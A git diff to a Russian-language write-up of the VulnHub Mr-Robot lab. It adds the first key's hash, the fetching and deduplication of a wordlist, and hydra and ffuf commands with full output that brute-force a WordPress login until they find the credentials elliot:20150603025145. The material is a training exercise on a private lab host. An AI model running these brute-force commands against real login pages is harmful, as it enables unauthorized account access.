@@ -74,9 +74,19 @@ fsocity.dic
 key-1-of-3.txt
 ```
 
-Нахожу `http://192.168.56.129/fsocity.dic`
-Загружаю себе
+Первый ключ по адресу `http://192.168.56.129/key-1-of-3.txt`
+```
+073403c8a58a1f80d943455fb30724b9
+```
+
+Загружаю себе `http://192.168.56.129/fsocity.dic`
 ```bash
+wget http://192.168.56.129/fsocity.dic
+```
+
+Сортирую и фильтрую
+```bash
+sort fsocity.dic | uniq > fsocity_filtered.txt
 ```
 
 ### WordPress
@@ -248,6 +258,112 @@ Interesting Finding(s):
 [+] Memory used: 281.422 MB
 [+] Elapsed time: 00:00:46
 ```
+
+Пробую сбрутить имя пользователя с помощью полученного словаря
+```bash
+┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
+└─$ hydra -L ./fsocity_filtered.txt -p admin -t 40 192.168.56.129 -s 80 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.129%2Fwp-admin%2F&testcookie=1:F=Invalid username" 
+
+[80][http-post-form] host: 192.168.56.129   login: Elliot   password: admin
+[80][http-post-form] host: 192.168.56.129   login: elliot   password: admin
+[80][http-post-form] host: 192.168.56.129   login: ELLIOT   password: admin
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-22 11:04:17
+```
+
+Hydra прошла по словарю за 11 минут...  
+Просто из любопытства проведу **benchmark** с помощью `ffuf` и фильтрации по размеру ответа  
+```bash
+┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
+└─$ ffuf -request ./post.txt -t 40 -request-proto http -w ./fsocity_filtered.txt -ic -c -fs 3608
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://192.168.56.129/wp-login.php
+ :: Wordlist         : FUZZ: /home/kali/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits/fsocity_filtered.txt
+ :: Header           : Referer: http://192.168.56.129/wp-login.php
+ :: Header           : Upgrade-Insecure-Requests: 1
+ :: Header           : Priority: u=0, i
+ :: Header           : Host: 192.168.56.129
+ :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+ :: Header           : Accept-Language: en-US,en;q=0.5
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Header           : Origin: http://192.168.56.129
+ :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ :: Header           : Accept-Encoding: gzip, deflate, br
+ :: Header           : Connection: keep-alive
+ :: Header           : Cookie: s_cc=true; s_fid=79C0FCABB9686E81-21543240C5D7C7BB; s_nr=1753192766411; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
+ :: Data             : log=FUZZ&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.129%2Fwp-admin%2F&testcookie=1
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 3608
+________________________________________________
+
+elliot                  [Status: 200, Size: 3659, Words: 144, Lines: 59, Duration: 1561ms]
+Elliot                  [Status: 200, Size: 3659, Words: 144, Lines: 59, Duration: 1570ms]
+ELLIOT                  [Status: 200, Size: 3659, Words: 144, Lines: 59, Duration: 1622ms]
+:: Progress: [11451/11451] :: Job [1/1] :: 25 req/sec :: Duration: [0:07:12] :: Errors: 5 ::
+```
+
+### Вывод по бенчмарку
+`ffuf` на 30% быстрее, чем `hydra` для этой задачи, но не поддерживает возобновление после сбоя/прерывания
+
+### Получил доступ к панели
+```bash
+┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
+└─$ ffuf -request ./post.txt -t 40 -request-proto http -w ./fsocity_filtered.txt -ic -c -fs 3659
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://192.168.56.129/wp-login.php
+ :: Wordlist         : FUZZ: /home/kali/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits/fsocity_filtered.txt
+ :: Header           : Origin: http://192.168.56.129
+ :: Header           : Connection: keep-alive
+ :: Header           : Upgrade-Insecure-Requests: 1
+ :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ :: Header           : Accept-Encoding: gzip, deflate, br
+ :: Header           : Accept-Language: en-US,en;q=0.5
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Header           : Referer: http://192.168.56.129/wp-login.php
+ :: Header           : Cookie: s_cc=true; s_fid=79C0FCABB9686E81-21543240C5D7C7BB; s_nr=1753192766411; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
+ :: Header           : Priority: u=0, i
+ :: Header           : Host: 192.168.56.129
+ :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+ :: Data             : log=elliot&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.129%2Fwp-admin%2F&testcookie=1
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 3659
+________________________________________________
+
+20150603025145          [Status: 200, Size: 1512, Words: 1, Lines: 1, Duration: 1573ms]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+```
+
+Креды `elliot:20150603025145`
 
 
 ## 📂 Получение доступа
